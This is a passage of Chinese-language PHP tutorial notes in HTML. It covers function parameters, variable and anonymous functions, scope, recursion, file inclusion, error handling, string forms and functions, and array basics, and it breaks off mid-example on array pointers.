src="https://gitee.com/ghat/blogimage/raw/master/img/20200527155526.png" alt="" loading="lazy"></p><h2 id="函数参数"><a href="#函数参数" class="headerlink" title="==函数参数=="></a>==函数参数==</h2><p><strong>形参（形式参数）</strong></p><p>​        就是定义函数的时候，在函数名后的小括号中给出的变量名。</p><p>​        形参，只能在函数内部使用——即该变量的使用范围仅仅局限于当前函数内部。</p><p>​        形参的本质是变量！</p><p><strong>实参（实际参数）</strong></p><p>​        就是调用函数的时候，在函数名后的小括号中给出的数据值。</p><p>​        实参的本质是数据！</p><p><strong>函数参数的传值方式</strong></p><p>含义：</p><p>​        实参变量的值，以什么方式传给形参。</p><p>说明：</p><p>​        其前提是：实参是一个变量的情况。</p><p>​        所以其实这里讨论的是：两个变量的传值方式问题。</p><p>​        默认情况下是值传递。</p><p>==可以使用“&amp;”符号设定为引用传递，形式如下：==</p><p>function f1( $p1, &amp;$p2, …. ）{ </p><p>。。。。。</p><p>}</p><p>此时，在函数内部，对该形参变量改变其值，则对应的实参变量（在函数外部）的值也改变了。</p><p><strong>形参的默认值</strong></p><p>形参可以设定默认值。形式为：$形参名 = 某值。</p><p>设定默认值的形参，只能放在没有设定默认值的形参的后面（右边）。</p><p>设定了默认值的形参对应的实参可以不提供数据，此时函数就会使用该默认值当做实参的值。</p><p>function f1($p1, ​$p2, ​$p3 = 3, $p4 =true ){</p><p>​        //函数体语句块</p><p>}</p><p>则此时调用上述函数，以下形式都可以：</p><p>f1(1,2);</p><p>f1(3, 4, 5);</p><p>f1(6,7,8, 9);</p><h2 id="函数返回值（重点"><a href="#函数返回值（重点" class="headerlink" title="函数返回值（重点)"></a>函数返回值（重点)</h2><p>含义：</p><p>​        一个函数在执行结束时，可以让其返回==一个==数据，这就是函数的返回值。</p><p>语法：</p><p>​        ==return 要返回的数据；==</p><p>说明：</p><ol><li><p>一般情况下一个函数执行结束都是需要返回一个数据值的。</p></li><li><p>函数也可以在执行的中途返回数据，此时，函数也是结束了的。</p></li><li><p>==一个函数执行得到的返回值，可以在任何需要数据的场合使用，跟使用一个变量数据一样。==</p></li></ol><h2 id="可变函数"><a href="#可变函数" class="headerlink" title="可变函数"></a>可变函数</h2><p>含义：</p><p>​        所谓可变函数，就是函数名是一个变量的情形。</p><p>​        可变函数实际上就是==在调用函数的时候，使用一个变量来表示函数名，并用该变量去调用函数。==</p><p>​        ==注意：定义函数的时候，不可以使用可变函数名!==</p><p>对比：</p><p>​        可变变量，就是变量名是一个变量，比如：$$v1;  </p><p>​        可变函数，就是函数名是一个变量，比如：</p><p>​                调用函数f1的语法是这样：f1();</p><p>​                可以使用可变函数的语法来调用：$func_name = “f1”; $func_name();   //此时实际就是调用f1</p><p>可变函数的本质是：一个变量的内容是一个字符串，该字符串是一个函数的名字，比如：</p><p>​        function f1(){ ……. }</p><p>​        function f2(){ ……. }</p><p>​        $f = “f1”;</p><p>​        <strong>$f();     //调用了函数f1，这就是可变函数！！</strong></p><p>​        $f = “f2”;</p><p>​        <strong>$f();     //调用了函数f2，这就是可变函数！！</strong></p><p>​        $f = “f3”;</p><p>​        $f();     //报错！因为没有f3这个函数</p><h2 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h2><p>含义：</p><p>​        就是一个“定义时没有名字”的函数。</p><p>此时，就面临一个问题，那就是：没有名字，怎么调用呢？</p><p>实际上，此时它通过另一个方式来调用，如下所示：</p><p>​        $f1 = function  (形参…) { …….  }     //这是定义匿名函数的形式。</p><p>​        $f1(实参);   //这就是调用该调用。可见其调用，跟可变函数的写法非常类似。</p><h2 id="系统常用函数介绍"><a href="#系统常用函数介绍" class="headerlink" title="系统常用函数介绍"></a>系统常用函数介绍</h2><p>PHP语言，以函数极大丰富而闻名于世。</p><p>看手册，查手册，并作为一种学习的习惯：</p><p><strong>跟函数有关的函数</strong></p><p>​    function_exists(“函数名”)：判断一个函数是否已经存在；</p><p>​    func_get_arg( $n )： 在函数内部可用，用于获得第n个实参（n从0开始算起）</p><p>​    func_get_args()：   在函数内部可用，用于获得所有实参，结果是一个数组</p><p>​    func_num_args()：  在函数内部可用，用于获得实参的个数</p><p>上面3个函数，可以让我们在自定义的函数内部，直接访问（使用）实参数据，而不依赖于形参变量。</p><p>这种特性，可以给我们定义某种“不确定有几个数据需要计算的”场合。</p><p><strong>字符串有关常用函数</strong></p><p>输出与格式化：echo , print, printf, print_r, var_dump.</p><p>字符串去除与填充：trim, ltrim, rtrim, str_pad</p><p>字符串连接与分割：implode, join， explode, str_split</p><p>字符串截取：substr, strchr, strrchr,</p><p>字符串替换：str_replace, substr_replace</p><p>字符串长度与位置： strlen, strpos, strrpos,</p><p>字符转换：strtolower, strtoupper, lcfirst, ucfirst, ucwords</p><p>特殊字符处理：nl2br, addslashes, htmlspecialchars, htmlspecialchars_decode,</p><p><strong>==常用数学函数（重点)==</strong></p><p>max：   取得若干个数据中的最大值</p><p>min：   取得若干个数据中的最小值</p><p>round： 对某个数据进行四舍五入（可以设定保留几位小数）</p><p>ceil：   对某个数“向上取整”：将一个数据往上找出其小的一个整数（含其本身）。</p><p>floor：  对某个数“向下取整”：将一个数据往下找出其大的一个整数（含其本身）</p><p>​        $n1 = floor(4.1);  //4</p><p>​        $n2 = floor(4.9);  //4</p><p>​        $n3 = floor(4);     //4</p><p>​        $n4 = floor(-4.1);  //-5</p><p>abs：   取得某个数据的绝对值</p><p>sqrt：   计算某个数的开方值</p><p>pow：   对某个数进行“幂运算”（就是获得某个数的若干次方）</p><p>​        $n1 = pow(3, 2);  //3的2次方,9</p><p>​        $n2 = pow(2, 3);  //8</p><p>​        $n3 = pow(1.5, 2); //2.25</p><p>​        $n4 = pow(1.5, 2.5);   //。。。。。1.5的2.5次方</p><p>​        $n5 = pow(9, 0.5);     //3，就是开方，相当于sqrt()</p><p>rand：  获得某两个数之间的随机整数（含该两个数）</p><p>mt_rand: 获得某两个数之间的随机整数（含该两个数），比rand更快。</p><p>​        $n1 = mt_rand(0, 10);  //随机数在0-10之间（含）</p><p><strong>常用时间函数</strong></p><p>​    <strong>time</strong>：获得当前时间（精确到秒），结果其实一个“整数”而已，代表从1970年1月1日0:0:0秒到当前时刻的秒数。</p><p>​    <strong>microtime</strong>：获得当前时间（可以精确到微秒）</p><p>​    mktime：创建一个时间数据，参数为：时、分、秒，月、日、年</p><p>​    date：将一个时间转换为某种字符串形式</p><p>​    idate：取得一个时间的某个单项数据值，比如idate(“Y”)取得年份数</p><p>​    strtotime：将一个字符串“转换”为时间值；</p><p>​    date_default_timezone_set：在代码中设置“时区”</p><p>​    date_default_timezone_get：在代码中获取“时区”</p><h1 id="函数相关"><a href="#函数相关" class="headerlink" title="函数相关"></a>函数相关</h1><h2 id="变量的作用域问题"><a href="#变量的作用域问题" class="headerlink" title="变量的作用域问题"></a>变量的作用域问题</h2><p>简单来说，有3种作用域：局部作用域，全局作用域，超全局作用域；</p><p>相对应的，有3种变量：  局部变量，  全局变量，  超全局变量；</p><p><strong>局部作用域与局部变量：</strong></p><p>​        就是函数内部范围的作用域，其中定义的变量就是局部变量（包括形参也是局部变量）。</p><p>​        局部变量只能在其所在的局部作用域中使用（访问）。</p><p>​        局部变量在函数调用结束时，会被自动销毁（可以理解为函数执行结束，该执行空间也被销毁了）。</p><p>​        $v1 = 1;</p><p>​        function f1( $p1 , $p2 ){    //此函数范围就是一个局部作用域，其中有3个局部变量：$p1, $p2, $v2</p><p>​                $v2 = 2;</p><p>​                echo $ v1;      ==//报错！变量未定义==</p><p>​                echo $v2;</p><p>​            }</p><p>​            f1(); //</p><p>​            echo $v1;</p><p>​            echo $v2;   ==//报错！变量未定义==</p><p><strong>静态变量：一个特殊的局部变量</strong></p><p>含义：</p><p>​        在函数内部，使用static关键字修饰的变量。</p><p>形式：</p><p>​            function XXX( …. ){</p><p>​                    static $s1 = 10;      //此时，$s1就是静态变量</p><p>​                        ……</p><p>​                    }</p><p>==静态变量的特点：==</p><p>​        ==静态变量的值不会在函数调用结束时被销毁，而是会一直保留。==</p><p>​        ==也就是说，当再次调用函数时，该变量（的值）还能继续使用。==</p><p><strong>全局作用域与全局变量</strong></p><p>​        就是函数外部范围的作用域，其中定义的变量就是全局变量。</p><p>​        全局变量只能在其所在的全局作用域中可以直接使用（访问）。</p><p><strong>超全局作用域与超全局变量</strong></p><p>​        包括局部作用域和全局作用域的的整个作用域范围。</p><p>​        超全局变量可以在所有范围中使用（访问）。</p><p>​        实际上，只有有限的10来个系统预定义变量是超全局变量，包括：$_GET, $_POST, $_REQUEST等。</p><p>​        所以，系统预定义变量，也被统称为超全局变量。</p><p>PHP中的不同作用域的图示：</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200527164611.png" alt="" loading="lazy"></p><p><strong>一个特别的超全局变量：$GLOBALS</strong></p><p>​        它也是一个数组，==其中存储了我们自己定义的所有全局变量。==</p><p>​        每个全局变量的变量名，就是$GLOBALS数组的一个单元。</p><p>​        比如：</p><p>​                在全局作用域中定义如下变量：</p><p>​                $v1 = 1;         //这一行执行，就有了一个这个：$GLOBALS[‘v1’], 其值为1</p><p>​                $v2 = ‘abc’;      //这一行执行，就有了一个这个：$GLOBALS[‘v2’], 其值为’abc’</p><p>​                $v3 = true;       //这一行执行，就有了一个这个：$GLOBALS[‘v3’], 其值为true</p><p>它可以让我们在局部作用域范围中，使用全局变量，方式如下：</p><p>​        $v1 = 10;     //全局变量</p><p>​        function func1( ){</p><p>​                echo $GLOBALS[‘v1’];   //输出10；</p><p>​            echo $v1;               //报错：变量v1未定义</p><p>​            $s1 = $GLOBALS[‘v1’] * 5; //结果为50；</p><p>​            $s2 = $v1 * 5;             //报错：变量v1未定义</p><p>}</p><p><strong>一个特别的的关键字：global</strong></p><p>作用：</p><p>​        用于在局部作用域中，修饰一个跟全局变量同名的局部变量。</p><p>​        此时该局部变量也可以使用全局变量的值了——实际上他们其实是类似变量引用关系。</p><h2 id="递归函数（重点-难点"><a href="#递归函数（重点-难点" class="headerlink" title="递归函数（重点/难点)"></a>递归函数（重点/难点)</h2><p>基本含义：</p><p>​        就是一个函数内部再调用该函数本身的一种情形，这是语法形式上的。</p><p>​        具体场景是：</p><p>​                如果要解决的“最终问题”，可以根据比该问题“小一级”的问题的答案而得到解决，</p><p>​                并且，该“小一级”的问题，还可以根据比其“更小一级”的问题的答案而得到解决，</p><p>​                以此类推，直到“最小一级”的问题。如果最小一级问题已知，则最终的问题也就解决了。</p><p><strong>==危险：==</strong></p><p>​        ==如果函数在执行的过程中没有一个“不再调用”的终结机制，那么就会出现“停不下来”的现象。==</p><p>原理：</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200527165100.png" alt="" loading="lazy"></p><p><strong>递归调用过程的代码演示：</strong></p><p>分析一下代码的输出结果：</p><p>​        function f1($n){</p><p>​                $n++;</p><p>​                echo “$n “;</p><p>​                if($n &lt; 5){</p><p>​                        f1($n);</p><p>​                }</p><p>​            echo “$n “;</p><p>​                }</p><p>​            f1(1);</p><h1 id="文件加载"><a href="#文件加载" class="headerlink" title="文件加载"></a>文件加载</h1><h2 id="文件加载的含义"><a href="#文件加载的含义" class="headerlink" title="文件加载的含义"></a>文件加载的含义</h2><p>含义：</p><p>​        ==将一个（别的）文件包含到当前文件中，成为当前文件运行过程中的一部分。==</p><p>​        通常，一些公共的代码，在多个页面都需要用到的时候，会做成一个独立的文件。</p><p>​        然后在不同的页面需要用到的时候，直接载入进来就可以了。</p><p>语法：</p><p>​        ==include “要载入的文件路径”;      //可以是相对路径，或本地物理路径。==</p><p>说明：</p><p>​        可以载入php文件，也可以载入html文件。</p><p>原理：</p><p>​        载入一个文件的本质是：将被载入的文件“插入”到当前载入代码所在的位置。</p><h2 id="文件加载的四种方式（重点"><a href="#文件加载的四种方式（重点" class="headerlink" title="==文件加载的四种方式（重点)=="></a>==文件加载的四种方式（重点)==</h2><p>四种方式如下所示：</p><p>​        include ‘要加载的文件’；</p><p>​        include_once  ‘要加载的文件’；</p><p>​        require   ‘要加载的文件’；</p><p>​        require_once ‘要加载的文件’；</p><p>==获取物理路径（绝对路径）的方式：==</p><p>​        ==__DIR__：表示当前文件所在路径，由它可以构建出绝对路径；==</p><p>​        ==getcwd()：表示当前正访问的网页路径，由它也可以构建出绝对路径；==</p><p>非相对非绝对路径（其实就是没有给出路径，只给出文件名）：不推荐！</p><p>​        形式为：  include ‘文件名’；</p><p>​        此时，会按如下顺序去寻找该文件：</p><p>​            1. 先在php.ini中include_path项设定的目录中寻找该文件；</p><p>​            2. 如果上一步没有找到，就在当前工作目录（由getcwd()获取）下寻找该文件；</p><p>​            3. 如果上一步没有找到，就在当前载入语句的文件所在目录（由<strong>DIR</strong>获取）下寻找；</p><p>​            4. 如果上一步还是没有找到，就报错了。        </p><h2 id="四种方式的区别"><a href="#四种方式的区别" class="headerlink" title="四种方式的区别"></a>四种方式的区别</h2><p>include：每次都载入文件（可能会重复载入），如果载入失败，在报错后继续执行后续语句；</p><p>include_once：只载入一次（不会重复载入），如果载入失败，在报错后继续执行后续语句；</p><p>require：每次都载入文件（可能会重复载入），如果载入失败，在报错后终止程序；</p><p>require_once：只载入一次（不会重复载入），如果载入失败，在报错后终止程序；</p><p>一般来说，如果被载入的文件内容，是后续代码运行的必备前提，则应该使用require载入。</p><p>如果被载入的文件内容，只需要（或只允许）出现一次，则应该使用”xxxx_once”载入。</p><h1 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h1><h2 id="错误分类"><a href="#错误分类" class="headerlink" title="错误分类"></a>错误分类</h2><p>语法错误：</p><p>​        程序不能运行，是在运行之前，检查语法的时候，就发现语法出错，结果是提示错误，不运行程序。</p><p>运行时错误：</p><p>​        语法检查没错，然后开始运行，在运行中出现了错误，然后报错。</p><p>​        这是开发中最常见的错误。</p><p>​     </p><p>逻辑错误：</p><p>​        程序能运行，且一直到结束没有报错，但执行得到的结果却是错的。</p><h2 id="常见错误代号（重点）"><a href="#常见错误代号（重点）" class="headerlink" title="常见错误代号（重点）"></a>常见错误代号（重点）</h2><p>含义：</p><p>​        是指在程序运行时，发生的错误，系统会针对每种错误，给出相应的错误代号，并进行提示（报错）。</p><p>​        另外，程序如果在运行之前检查语法的时候就发现语法错误，也会报错，也有一个错误代号。</p><p>常见错误代号有：</p><p>​        E_NOTICE：</p><p>​            提示性错误，轻微；</p><p>​            错误发生后，后面的程序继续执行。</p><p>​        E_WARNING：</p><p>​            警告性错误，稍微严重；</p><p>​            错误发生后，后面的程序继续执行。</p><p>​        E_ERROR：</p><p>​            严重错误/致命错误；</p><p>​            错误发生后，后面的程序不再执行！</p><p>​        E_PARSE：</p><p>​            语法错误（语法解析错误）；</p><p>​            语法解释错误，是直接就不运行程序。</p><p>​        E_USER_NOTICE：</p><p>​            用户自定义的提示错误</p><p>​        E_USER_WARNING：</p><p>​            用户自定义的警告错误</p><p>​        E_USER_ERROR：</p><p>​            用户自定义的严重错误</p><p>​        E_ALL：</p><p>​            它是一个代表“所有”错误的代号。</p><p>说明：</p><ol><li><p>这些错误代号，其实只是系统预先设定的一些常量，他们的值大约是：1， 2， 4， 8， 16…..</p></li><li><p>这些错误代号，通常只是用于对错误控制时进行“设置”使用。</p></li><li><p>他们是一系列的整数，并具有一定的规律：1,2,4,8,16,32,64， 。。。。</p></li><li><p>可以在php.ini中使用（设置）他们，如下所示：</p></li></ol><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200527170446.png" alt="" loading="lazy"></p><h2 id="错误触发"><a href="#错误触发" class="headerlink" title="错误触发"></a>错误触发</h2><p>就是发生了一个错误的意思——即触发了错误。</p><p>有两种情形会触发错误：</p><p>​        1. 程序本身有错，则运行时就会触发错误（并提示）。</p><p>​        2. 程序本身没错，但出现不符合预计的情形（比如数据不符合要求）。</p><p>​            此时程序员可以主动触发一个错误，也可以说是由程序员“主动创建一个错误”</p><p>​            ——这就是“用户错误”，包括：</p><p>​                    E_USER_NOTICE：</p><p>​                    E_USER_WARNING：</p><p>​                    E_USER_ERROR：</p><p>如何触发“用户错误”呢？</p><p>自定义错误触发语法：</p><p>​            trigger_error(“自定义错误提示内容”, 自定义错误的代号);</p><h2 id="错误显示设置"><a href="#错误显示设置" class="headerlink" title="错误显示设置"></a>错误显示设置</h2><p>如果有错误发生（触发了错误），==默认情况下会被显示在页面==（即输出的结果页面）。</p><p>我们可以对此进行设置，以决定以下两点：</p><p>​        1. 设置display_errors以决定是否显示错误：</p><p>​                    在php.ini中设置：   display_errors = On或Off</p><p>​                            这里设置，影响所有使用该php语言引擎的代码（网站页面）；</p><p>​                    在php文件中设置：  ini_set(‘display_errors’, 1或0);  //1表示显示，0不显示</p><p>​                            在这里设置，只影响当前网页代码本身。</p><p>​        2. 设置error_reporting以决定显示哪些错误：</p><p>​                    在php.ini中设置：   error_reporting = 错误代号1 | 错误代号2 | ….. </p><p>​                            //(要显示的就写出来，或者可以写E_ALL, 表示显示所有）</p><p>​                            在代php文件中，道理类似：ini_set(‘error_reporting’, 错误代号1 | 错误代号2 | …..）</p><h2 id="错误日志设置"><a href="#错误日志设置" class="headerlink" title="错误日志设置"></a>错误日志设置</h2><p>如果有错误发生（触发了错误），默认情况下不会将错误信息记录（保存）下来。</p><p>我们可以对此进行设置，以决定以下两点：</p><p>​        1. 设置log_errors以决定是否记录错误：</p><p>​                    php.ini中设置：   log_errors = On 或 Off</p><p>​                    代码文件中设置： ini_set (‘log_errors’, 1或0)</p><p>​        2. 设置error_log以决定记录到哪里：</p><p>​                    通常，就设置为一个文件名，php系统会在网站的每个文件夹下都建立该文件，并记录错误。</p><p>​                    php.ini中： error_log = error.txt;     //它是纯文本的</p><p>​                    代码中： ini_set(“error_log”, ‘error.txt’);</p><h2 id="自定义错误处理（重点-难点"><a href="#自定义错误处理（重点-难点" class="headerlink" title="==自定义错误处理（重点/难点)=="></a>==自定义错误处理（重点/难点)==</h2><p>之前，我们面对的情形都是错误发生的时候，系统生成错误，并处理错误（给出错误信息）。</p><p>我们能控制的就只是：是否显示，显示什么，是否记录，记录到哪里？</p><p>实际上，我们也可以更进一步控制错误信息，以决定错误发生的时候，显示什么样的错误信息。</p><p>这就是“自定义错误处理”。</p><p>具体做法，分2步：</p><p>​        第1步：</p><p>​            声明错误发生时，由我们自己来处理——设定一个错误处理的函数名。</p><p>​        第2步：</p><p>​            定义该函数，在函数中详细设定错误的处理情况：怎么显示，显示什么，怎么记录，记录什么。</p><h1 id="字符串详解"><a href="#字符串详解" class="headerlink" title="字符串详解"></a>字符串详解</h1><h2 id="4种不同形式的字符串"><a href="#4种不同形式的字符串" class="headerlink" title="4种不同形式的字符串"></a>4种不同形式的字符串</h2><p><strong>单引号字符串</strong></p><p>​        形式：  $s1 = ‘字符串内容’</p><p>​        特点：</p><p>​                只能使用2个转义符： \\（代表一个反斜杠） \’（代表一个单引号）</p><p>​        ==通常，如果没有其他特殊需求（比如字符串中使用一些转义符，以及一些变量），则推荐使用单引号字符串。！==</p><p><strong>双引号字符串</strong></p><p>形式： $s1 = “字符串内容”</p><p>特点：</p><p>​    1. 能使用较为丰富的转义符，包括：\  \”   \n  \r   \t   $等</p><p>​            \n  ：代表“换行符”（就是一个新行）</p><p>​            \r   ：代表“回车符”（其实也是一个新行）</p><p>​            \t   ：代表“tab符”，</p><p>​            $  ：代表“$”本身，因为双引号字符串中能识别（解析）变量，则如果不想要去解析，就用此转义！</p><p>​            $v1 = 10;</p><p>​            echo “结果为：$v1”; //输出内容为： 结果为：10</p><p>​            echo “结果为：$v1”; //输出内容为： 结果为：$v1</p><p>​        2. “$”符号在其中会被识别为是变量的起始符号，并试图读取变量值——即能识别变量；</p><p>​        3. 识别其中变量，建议使用大括号括起来，类似这样：{$变量名}， {$数组[‘下标’]}</p><p><strong>heredoc字符串</strong></p><p>形式：$s1 = &lt;&lt;&lt;==“标识符”==</p><p>这里写字符内容，可以多行写</p><p>标识符;</p><p>特点：</p><p>​    1. 特点跟双引号字符串一样！</p><p>注意：</p><p>​    ==标识符结束那一行，只能出现标识符及紧挨着的分号，任何其他字符都不可以出现。==</p><p><strong>nowdoc字符串</strong></p><p>形式：$s1 = &lt;&lt;&lt;==‘标识符’==</p><p>这里写字符内容，可以多行写</p><p>标识符;</p><p>特点：无特点，是最“纯净”的字符串，写什么就是什么。</p><p>heredoc字符串，和nowdoc字符串，适用于表达（描述）一大段内容的字符串，特别是适合于写html部分的代码（含js，css等）。</p><p>如下：</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200527172348.png" alt="" loading="lazy"></p><h2 id="转义字符"><a href="#转义字符" class="headerlink" title="转义字符"></a>转义字符</h2><p>转义的字符的本质，其实是在一个字符串的语法形式中，如何来表达一些相对特殊的一些字符的问题。</p><p>比如：</p><p>​        双引号字符串：$s = “这里字符串内容，要是直接出现双引号就会有语法问题。”</p><h2 id="字符串的长度问题"><a href="#字符串的长度问题" class="headerlink" title="字符串的长度问题"></a>字符串的长度问题</h2><p>字符串的长度问题，有两个方面的理解：</p><ol><li><p>一个字符串有几个字符（人可见到的字符个数）；</p></li><li><p>一个字符串占据多少个字节空间（人不可见）；</p></li></ol><p><strong>几个常识：</strong></p><p>​    ==a，1字节（B）就是8个bit位（最小的存储空间），1KB=1024B，1MB=1024KB，1GB=1024MB。。==</p><p>​    ==b，一个英文字符占据1字节空间，gbk编码中1个汉字占据2个字节，utf8编码1个汉字占3字节。==</p><p>求php字符串的长度，，有两个函数：</p><p>​        strlen(字符串)：</p><p>​            求该字符串的“字节数”，也就是占据的字节空间大小；</p><p>​        mb_strlen(字符串)：</p><p>​            求该字符串的“字符个数”。</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200527172832.png" alt="" loading="lazy"></p><p>该模块准确的位置如下：</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200527172857.png" alt="" loading="lazy"></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200527172913.png" alt="" loading="lazy"></p><h2 id="常用字符串函数（重点"><a href="#常用字符串函数（重点" class="headerlink" title="常用字符串函数（重点)"></a>常用字符串函数（重点)</h2><p>字符串输出：</p><p>​        echo： 输出一个或多个字符（不是函数，是语言结构）</p><p>​        print：输出一个字符串</p><p>​        print_r：输出变量的较为详细的信息</p><p>​        var_dump：输出变量的完整信息</p><p>字符串去除与填充：</p><p>​        trim：消除一个字符串两端的空白字符或指定字符（空白字符包括：空格，\n, \r, \t等）</p><p>​        ltrim：消除一个字符串左边的空白字符或指定字符</p><p>​        rtrim：消除一个字符串右边的空白字符或指定字符</p><p>​        str_pad：将一个字符串使用指定的字符填充到指定的长度</p><p>字符串连接与分割：</p><p>​        implode：将一个数组的值连接起来组成一个字符串</p><p>​        join：同implode</p><p>​        explode： 将一个字符串使用指定的字符分割为一个数组</p><p>​        str_split：将一个字符串按指定的长度分割为一个数组</p><p>字符串截取：</p><p>​        substr：获取一个字符串中指定位置开始指定长度的子字符串</p><p>​        strstr：获取一个字符串中某个指定字符首次出现的位置起，到最后结尾处的字符<br>​                strstr(‘abcd.12.3.txt’, ‘.’);   //结果是：”.12.3.txt”</p><p>​        strrchr：获取一个字符串中某个指定字符最后一次出现的位置起，到最后结尾处的字符<br>​                strrchr(‘abcd.12.3.txt’, ‘.’);  //结果是：”.txt”</p><p>字符串替换：</p><p>​        str_replace：将一个字符串中的指定字符，替换为给定的新字符。</p><p>​        substr_replace：将一个字符串中指定位置开始的指定个数的字符，替换为给定的新字符。</p><p>字符串长度与位置： </p><p>​        strlen：获取字符串的字节长度。</p><p>​        strpos：获取一个字符串中某个子字符串首次出现的位置。<br>                strpos(‘abcd.12.3.txt’, ‘.’);  //结果是：4</p><p>​        strrpos：获取一个字符串中某个子字符串最后一次出现的位置。</p><p>​                strrpos(‘abcd.12.3.txt’, ‘.’);  //结果是：9</p><p>​                strrpos(‘abcd.12.3.txt’, ‘cd’); //结果是：2</p><p>字符转换：</p><p>​        strtolower：将一个字符串转换为小写。</p><p>​        strtoupper：将一个字符串转换为大写。</p><p>​        lcfirst：将一个字符串的首字母转换为小写。</p><p>​        ucfirst：将一个字符串的首字母转换为大写。</p><p>​        ucwords：将一个字符串中的所有单词的首字母转换大写。</p><p>特殊字符处理：</p><p>​        nl2br：将换行符转换为”<code>&lt;br /&gt;</code>”标签字符</p><p>​        addslashes： 将一个字符串中的以下几个字符使用反斜杠进行转义：\    ‘   “   </p><p>​        htmlspecialchars：将html中的特殊字符转换为html实体字符，如下所示： </p><p>​            （&amp; ‘ “ &lt; &gt; ）分别转换为：（（&amp; &apos; &quot; &lt; &gt; ）</p><p>​        htmlspecialchars_decode：将html实体字符，转换回原本的字符。</p><p>案例：</p><p>​        取出如下若干个文件中的图片文件。</p><p>​        $files = array(‘abc.gif’, ‘123.txt’, ‘dir1/gift.PNG’, ‘file1.JPG’, ‘gif动画制作教程.doc’ );</p><h1 id="数组详解"><a href="#数组详解" class="headerlink" title="数组详解"></a>数组详解</h1><h2 id="数组的概念和定义"><a href="#数组的概念和定义" class="headerlink" title="数组的概念和定义"></a>数组的概念和定义</h2><p>==数组，是指将若干数据按一定的顺序组合为一个整体。==</p><p>每个数据被称为一个“单元”——数组单元。</p><p>每个单元由两部分构成：下标和值，下标也称为“键”（key），</p><p>数组的一个重要特点是：其中的数据有明确的顺序，而是，是其放入数组时的先后顺序。</p><p>数组有如下几种定义形式：</p><p>形式1：</p><p>​        $arr1 = array(单元1，单元2，…）；</p><p>形式2：</p><p>​        $arr2 = [单元1，单元2，…]；</p><p>​        单元（元素）的形式为： [下标=&gt;]值</p><p>形式3：（不推荐）</p><p>​        $arr3[下标1] = 值1；</p><p>​        $arr3[下标2] = 值2；</p><p>数据取值的语法形式：</p><p>​        $数组名[下标];       //其中，下标可以是整数的，也可以是字符串的（注意有引号）</p><h2 id="数组下标问题"><a href="#数组下标问题" class="headerlink" title="数组下标问题"></a>数组下标问题</h2><p><strong>下标的可用值</strong></p><p>​        可以使用整数或字符串。</p><p><strong>整数下标的特性</strong></p><p>​        可以使用任意整数，也可以不显式使用下标，此时默认就是整数下标。</p><p>​        而且，从前往后，每一个没有使用下标的单元，系统给其分配的下标为之前所用过的整数下标的最大值+1（对于第一个是0）。</p><p>​        $arr1 = array(‘a’, 2=&gt;’b’, ‘c’, ‘x’=&gt;’d’, ‘e’);  // 其下标分别为：0, 2, 3, ‘x’, 4</p><p>​        $arr2 = array(5=&gt;‘a’, 2=&gt;’b’, ‘c’, ‘x’=&gt;’d’);    // 其下标分别为：5, 2, 6, ‘x’</p><p>​        $arr3[‘x’] = 5;     //这一行，会自动创建一个数组，</p><p>​        $arr3[ ]  = 6;     //此时下标就是0</p><p><strong>索引数组</strong></p><p>通常是指一个数组的下标是从0开始的连续的整数。</p><p>举例1：</p><p>​        $arr1 = array(5, 8, 12, 2, 3);</p><p>​        $arr2 = [8, 22, 24, 22, 12];</p><p>​        $arr3[ ] = 8;</p><p>​        $arr3[ ] = 24;</p><p>​        $arr3[ ] = 22;</p><p><strong>关联数组</strong></p><p>通常是指一个数组的下标都是字符串。</p><p>​        $person = array(</p><p>​                ‘name’=&gt;’张三’， </p><p>​                ‘age’=&gt;18, </p><p>​                ‘edu’=&gt; ‘大学’, </p><p>​                ‘salary’=&gt;10000, </p><p>​                ‘from’=&gt;’北京’,</p><p>​        );</p><h2 id="PHP数组的维数"><a href="#PHP数组的维数" class="headerlink" title="PHP数组的维数"></a>PHP数组的维数</h2><p>按通常的数组元素的复杂程度，数组可以分为一维数组，二维数组，三维数组等等</p><p>一维数组：</p><p>数组的每一个单元的值都是一个“非数组”值。</p><p>$arr1 = array(11, 12, 13, 14);</p><p>二维数组：</p><p>数组的每个单元的值都是一个“一维数组”。</p><p>$arr2 = array(</p><p>array(11, 12, 13),</p><p>array(21, 22, 23),</p><p>…..</p><p>);</p><p>三维数组：</p><p>数组的每个单元的值都是一个“二维数组”。</p><p>多维数组：</p><p>依此类推。。。。</p><p>不整齐数组（异形数组）：</p><p>实际上，由于PHP的数组值可以是“任意数据”，因此，PHP数组的维数其实没有太大实际意义的。</p><p>所谓维数，其实是另一些编程语言中的数组的“整齐”格式的说法：一维数组类似排成一排的格子（线）；二维数组类似排成一个平面的格子（面）；三维数组类似堆满了一屋子的格子（体）。</p><p>而php数组，却可以更为灵活，类似这样：</p><p>array(</p><p>1, 2, array(31, 32, ), 4,</p><p>array(51, 52, 53, array(541, 542, 543, 544) ), </p><p>6, array(71, 72, 73), </p><p>);</p><p>这种数组就不好说几维的了，而可以称为“异形数组。</p><h2 id="数组的遍历（重点）"><a href="#数组的遍历（重点）" class="headerlink" title="==数组的遍历（重点）=="></a>==数组的遍历（重点）==</h2><p><strong>使用foreach语句遍历数组</strong></p><p>遍历：就是对数组的每一项都“访问”到并进行所需要的数据处理。</p><p>foreach( $数组名 as [​$key =&gt;] $value){</p><p>​            //这里，$key和$value只是变量，它会在遍历数组的过程中，按顺序依次取得数组每个单元的下标和值。</p><p>echo “<code>&lt;br /&gt;</code>{$key} &gt;&gt;&gt; {$value} “;</p><p>}</p><p><strong>使用for循环语句遍历数组</strong></p><p>数组的指针：每一个数组内部，都有一个“指针”，正常情况下，指针指向数组的某个单元，起初默认是指向第一个单元。</p><p>对于数组 $arr1 = array( 18, 22, 13, 28, 15, 33, );</p><p>​                                    </p><table><thead><tr><th>下标</th><th>0</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th></tr></thead><tbody><tr><td>值</td><td>18</td><td>22</td><td>13</td><td>28</td><td>15</td><td>33</td></tr></tbody></table><p>初始状态下，指针指向数组的第一个单元。</p><p>php中，有如下几个函数，可以针对数组指针进行相应操作：</p><p>​        $re = current( $arr1);     